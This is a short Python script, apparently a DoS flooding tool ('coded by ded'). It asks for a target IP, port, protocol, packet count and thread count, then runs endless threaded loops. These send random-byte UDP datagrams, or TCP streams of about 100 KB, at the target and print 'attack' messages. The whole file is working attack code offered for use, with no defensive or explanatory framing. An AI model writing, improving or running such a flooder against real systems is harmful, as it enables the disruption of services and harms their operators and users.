##coded by ded
from colorama import Fore, Back, Style
import sys
import getpass
import os
import random
import socket
import threading
import time
os.system("clear")
print(Fore.GREEN +"З А Г Р У З К А....")
time.sleep(3.5)
os.system("clear")

ip = str(input("[+] IP : =>"))
port = int(input("[+] Port : =>"))
choice = str(input("[+] Methods TCP/UDP : =>"))
times = int(input("[+] Packet : =>"))
threads = int(input("[+] Threads : =>"))

def udp():
	data = random._urandom(1180)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(f"attack {ip} port {port}")
		except:
			print(f"attack {ip} port {port}")

def tcp():
	data = random._urandom(102498)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(f"attack {ip} port {port}")
		except:
			s.close()
			print(f"attack {ip} port {port}")


for y in range(threads):
    if choice == 'UDP':
        th = threading.Thread(target = udp)
        th.start()
    elif choice == 'TCP':
        th = threading.Thread(target = tcp)
        th.start()
